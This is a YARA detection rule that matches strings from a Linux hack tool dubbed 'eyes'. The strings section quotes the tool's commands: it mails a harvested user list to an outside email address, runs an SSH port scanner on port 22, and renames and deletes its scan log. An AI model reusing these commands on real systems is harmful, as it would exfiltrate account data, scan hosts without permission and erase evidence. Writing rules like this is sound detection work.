rule LinuxHacktool_eyes_a {
  meta:
    author = "Spider"
    comment = "None"
    date = "2015/01/19"
    description = "Linux hack tools - file a"
    family = "None"
    hacker = "None"
    hash = "458ada1e37b90569b0b36afebba5ade337ea8695"
    judge = "black"
    license = "https://creativecommons.org/licenses/by-nc/4.0/"
    reference = "not set"
    threatname = "None"
    threattype = "None"
  strings:
    $s0 = "cat trueusers.txt | mail -s \"eyes\" clubby@slucia.com" fullword ascii
    $s1 = "mv scan.log bios.txt" fullword ascii
    $s2 = "rm -rf bios.txt" fullword ascii
    $s3 = "echo -e \"# by Eyes.\"" fullword ascii
    $s4 = "././pscan2 $1 22" fullword ascii
    $s10 = "echo \"#cautam...\"" fullword ascii
  condition:
    2 of them
}